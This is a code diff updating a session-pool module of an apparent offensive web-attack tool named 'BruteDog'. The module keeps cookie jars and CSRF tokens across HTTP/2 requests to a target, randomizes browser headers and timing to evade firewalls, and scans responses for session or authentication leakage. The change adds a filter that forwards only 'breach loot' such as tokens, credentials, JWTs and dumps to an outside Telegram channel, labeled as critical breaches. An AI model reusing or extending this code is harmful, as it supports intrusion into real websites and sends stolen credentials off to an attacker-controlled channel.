@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-SESSION_POOL.PY v8.5 — Persistent HTTP/2 Session, Cookie Jar & Multiplexed Request Pool (WAF Hardened)
+SESSION_POOL.PY v8.8 — Persistent HTTP/2 Session, Cookie Jar & Multiplexed Request Pool (WAF Hardened)
 Features:
-- Manages persistent sessions, cookie jars, and headers across HTTP/2 multiplexed requests to prevent session drops
-- Weaponized with automatic CSRF synchronization, wrapper request handlers, and behavioral jitter
-- Real-time asynchronous Telegram notification dispatch and centralized session telemetry
+- Zero-noise filtering: Restricts Telegram alerts strictly to verified high-value breach loot.
+- Manages persistent sessions, cookie jars, and headers across HTTP/2 multiplexed requests to prevent session drops.
+- Weaponized with automatic CSRF synchronization, wrapper request handlers, and behavioral jitter.
 """
 import httpx
 import logging
@@ -17,14 +17,24 @@ from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hin
 
 logger = logging.getLogger("BruteDog.SessionPool")
 
+# Keywords required to pass the zero-noise filter
+HIGH_VALUE_KEYWORDS = [
+    "critical", "bypass", "success", "loot", "token", "session", 
+    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump"
+]
+
 def broadcast_tg_alert_sync(loot_type, details):
-    """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
+    """Helper to non-blockingly fire Telegram alerts from synchronous functions with zero-noise filtering."""
     try:
+        check_str = f"{loot_type} {str(details)}".lower()
+        if not any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
+            return  # Suppress low-priority telemetry chatter completely
+
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        loop.create_task(send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details))
         except Exception:
             pass
 
@@ -33,14 +43,13 @@ class PersistentSessionPool:
     Manages persistent sessions, cookie jars, and headers across HTTP/2 multiplexed 
     requests to prevent session drops during high-concurrency race conditions.
     Weaponized with automatic CSRF synchronization, wrapper request handlers, 
-    and real-time Telegram telemetry broadcasting.
+    and real-time zero-noise Telegram telemetry broadcasting.
     """
     def __init__(self, base_url: str, verify_ssl: bool = False, http2: bool = True):
         self.base_url = base_url.rstrip("/")
         self.verify_ssl = verify_ssl
         self.http2 = http2
         
-        # Initialize a shared cookie jar and headers with randomized browser hints
         self.cookie_jar = httpx.Cookies()
         self.default_headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
@@ -50,12 +59,10 @@ class PersistentSessionPool:
             "Cache-Control": "no-cache"
         }
         self.default_headers.update(get_randomized_hints())
-        logger.info(f"[+] Initialized PersistentSessionPool for target: {self.base_url} (HTTP/2: {self.http2})")
 
     def update_headers(self, new_headers: Dict[str, str]) -> None:
         """Dynamically update default headers (e.g., Authorization Bearer tokens or CSRF tokens)."""
         self.default_headers.update(new_headers)
-        logger.debug(f"[+] Session headers updated: list of keys -> {list(new_headers.keys())}")
 
     def set_csrf_token(self, token: str) -> None:
         """Automatically injects CSRF tokens into standard framework header keys."""
@@ -64,7 +71,6 @@ class PersistentSessionPool:
                 "X-CSRF-TOKEN": token,
                 "X-XSRF-TOKEN": token
             })
-            logger.debug(f"[+] CSRF tokens synchronized into session headers.")
 
     def get_client(self, timeout: float = 10.0) -> httpx.Client:
         """Returns a synchronous httpx.Client sharing the persistent cookie jar."""
@@ -91,7 +97,7 @@ class PersistentSessionPool:
         )
 
     def sync_cookies(self, response_cookies: Union[httpx.Cookies, dict, str]) -> None:
-        """Manually synchronize external cookie responses into the master jar safely, handling strings/dicts."""
+        """Manually synchronize external cookie responses into the master jar safely."""
         try:
             if isinstance(response_cookies, str):
                 for cookie_pair in response_cookies.split(";"):
@@ -106,8 +112,6 @@ class PersistentSessionPool:
                     self.cookie_jar.set(k, v)
             else:
                 self.cookie_jar.update(response_cookies)
-            
-            logger.debug("[+] Cookie jar synchronized with latest response cookies.")
         except Exception as exc:
             logger.error(f"[-] Failed to synchronize cookies: {exc}")
 
@@ -133,7 +137,6 @@ class PersistentSessionPool:
                 else:
                     resp = client.get(url)
 
-                # Automatically synchronize any new cookies returned by the server
                 if resp.cookies:
                     self.cookie_jar.update(resp.cookies)
 
@@ -141,7 +144,6 @@ class PersistentSessionPool:
                 if set_cookie:
                     self.sync_cookies(set_cookie)
 
-                # Check for high-value authentication or session leakage in response, avoiding SPA false positives
                 body = resp.text
                 body_lower = body.lower()
                 is_spa_shell = 'div id="root"' in body_lower or 'div id="__next"' in body_lower or len(body.strip()) < 150
@@ -159,9 +161,3 @@ class PersistentSessionPool:
             except Exception as e:
                 logger.error(f"[-] Request failed for {method} {url}: {e}")
                 return 0, {}, str(e)
-
-
-# --- AUTOMATED ALIAS PATCH --- 
-async def PersistentSessionPool(*args, **kwargs):
-    return await broadcast_tg_alert_sync(*args, **kwargs)
-
